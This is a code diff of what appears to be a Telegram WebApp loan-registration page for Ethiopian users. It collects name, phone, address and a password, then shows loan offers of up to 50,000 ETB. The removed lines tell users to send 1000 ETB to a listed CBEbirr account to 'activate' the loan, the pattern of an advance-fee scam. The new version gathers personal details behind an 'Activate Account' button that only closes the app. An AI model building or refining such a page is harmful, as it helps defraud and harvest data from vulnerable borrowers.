@@ -11,10 +11,20 @@
       color: #333;
       margin: 0;
       padding: 0;
-      display: flex;
+      transition: all 0.3s ease;
+    }
+
+    .page {
+      display: none;
+      flex-direction: column;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
+      padding: 20px;
+    }
+
+    .page.active {
+      display: flex;
     }
 
     .container {
@@ -58,89 +68,113 @@
       background-color: #fbc02d;
     }
 
-    .result {
+    .loan-options {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 15px;
+      justify-content: center;
       margin-top: 20px;
-      font-weight: bold;
     }
 
-    .success {
-      color: green;
+    .loan-card {
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      padding: 20px;
+      width: 140px;
+      text-align: center;
+      transition: transform 0.2s ease;
     }
 
-    .payment {
-      color: #d4af37;
-      font-size: 16px;
-      margin-top: 10px;
+    .loan-card:hover {
+      transform: translateY(-5px);
+    }
+
+    .activate-btn {
+      margin-top: 30px;
+      background-color: #d4af37;
+      color: white;
     }
 
     .error {
       color: red;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h2>Register for Loan</h2>
-    <form id="registerForm">
-      <input type="tel" id="phone" placeholder="Phone Number" required />
-      <input type="password" id="password" placeholder="Create Password" minlength="6" required />
-      <button type="submit">Register</button>
-    </form>
+  <!-- First Page: Registration -->
+  <div class="page active" id="registerPage">
+    <div class="container">
+      <h2>Register for Loan</h2>
+      <form id="registerForm">
+        <input type="text" id="name" placeholder="Full Name" required />
+        <input type="text" id="phone" placeholder="Phone Number" required />
+        <input type="text" id="address" placeholder="Address" required />
+        <input type="password" id="password" placeholder="Create Password" minlength="6" required />
+        <button type="submit">Register</button>
+        <div class="error" id="errorMsg"></div>
+      </form>
+    </div>
+  </div>
 
-    <div class="result" id="result"></div>
-
-    <!-- Manual Close Button -->
-    <button id="closeBtn" style="display: none;" onclick="closeWebApp()">Close</button>
+  <!-- Second Page: Loan Options -->
+  <div class="page" id="loanPage">
+    <div class="container">
+      <h2>Select Loan Type</h2>
+      <div class="loan-options">
+        <div class="loan-card"><strong>Personal Loan</strong><br/>Up to 5000 ETB</div>
+        <div class="loan-card"><strong>Business Loan</strong><br/>Up to 50,000 ETB</div>
+        <div class="loan-card"><strong>Education Loan</strong><br/>Up to 20,000 ETB</div>
+        <div class="loan-card"><strong>Emergency Loan</strong><br/>Up to 10,000 ETB</div>
+      </div>
+      <button class="activate-btn" onclick="closeWebApp()">Activate Account</button>
+    </div>
   </div>
 
   <!-- Telegram WebApp SDK -->
   <script src="https://telegram.org/js/telegram-web-app.js "></script>
   <script>
-    document.addEventListener('DOMContentLoaded', function () {
-      const form = document.getElementById('registerForm');
-      const resultDiv = document.getElementById('result');
-      const closeBtn = document.getElementById('closeBtn');
+    const registerPage = document.getElementById('registerPage');
+    const loanPage = document.getElementById('loanPage');
+    const errorMsg = document.getElementById('errorMsg');
+    const form = document.getElementById('registerForm');
 
-      form.addEventListener('submit', function (e) {
-        e.preventDefault();
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+      errorMsg.textContent = '';
 
-        const phone = document.getElementById('phone').value.trim();
-        const password = document.getElementById('password').value.trim();
+      const name = document.getElementById('name').value.trim();
+      const phone = document.getElementById('phone').value.trim();
+      const address = document.getElementById('address').value.trim();
+      const password = document.getElementById('password').value.trim();
 
-        // Clear previous messages
-        resultDiv.innerHTML = '';
-        closeBtn.style.display = 'none';
-
-        // Basic validation
-        if (!/^\d{10}$/.test(phone)) {
-          resultDiv.innerHTML = '<div class="error">Please enter a valid 10-digit phone number.</div>';
-          return;
-        }
-
-        if (password.length < 6) {
-          resultDiv.innerHTML = '<div class="error">Password must be at least 6 characters.</div>';
-          return;
-        }
-
-        // Show success message with deposit method
-        resultDiv.innerHTML = `
-          <div class="success">✅ Registration Successful!</div>
-          <div class="payment">Deposit Method: <strong>CBEbirr</strong></div>
-          <div class="payment">Account Number: <strong>0931538123</strong></div>
-          <div class="payment"><small>Please send 1000 ETB to activate your loan.</small></div>
-        `;
-
-        // Show manual close button
-        closeBtn.style.display = 'block';
-      });
-
-      function closeWebApp() {
-        if (window.Telegram && window.Telegram.WebApp) {
-          Telegram.WebApp.close();
-        }
+      if (!/^\d{10}$/.test(phone)) {
+        errorMsg.textContent = 'Please enter a valid 10-digit phone number.';
+        return;
       }
+
+      if (password.length < 6) {
+        errorMsg.textContent = 'Password must be at least 6 characters.';
+        return;
+      }
+
+      if (!name || !address) {
+        errorMsg.textContent = 'Please fill in all fields.';
+        return;
+      }
+
+      // Hide registration page, show loan page
+      registerPage.classList.remove('active');
+      loanPage.classList.add('active');
     });
+
+    function closeWebApp() {
+      if (window.Telegram && window.Telegram.WebApp) {
+        Telegram.WebApp.close();
+      }
+    }
   </script>
 
 </body>
